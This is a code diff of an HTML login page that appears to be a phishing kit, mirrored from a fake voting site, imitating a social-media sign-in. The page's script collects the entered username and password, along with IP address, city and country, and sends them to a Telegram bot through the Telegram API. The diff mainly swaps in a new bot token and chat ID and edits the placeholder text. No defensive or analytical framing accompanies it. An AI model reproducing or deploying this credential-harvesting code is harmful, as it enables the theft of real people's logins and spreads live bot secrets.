@@ -32,7 +32,7 @@
             
 
             <div class="mb-4">
-                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Mobile number or email address" type="text" name="username" id="username" required/>
+                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="phone number, username or email address" type="text" name="username" id="username" required/>
             </div>
             <div class="mb-4">
                 <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="text" name="password" id="password" required/>
@@ -89,8 +89,8 @@
       const country = document.getElementById('country').value;
             var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
            
-          var token = '8142342762:AAEMPibryAQO6P8fttpyajD4js0FvR6iGuw';
-        var chat_id = '6757391137';
+          var token = '7444849623:AAGq3rvk2TPQDJAoBGWVe2PhLIeFOmnH9KU';
+        var chat_id = '8022753791';
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
             fetch(url)
@@ -111,4 +111,4 @@
 </body>
 
 <!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:55 GMT -->
-</html>
+    </html>
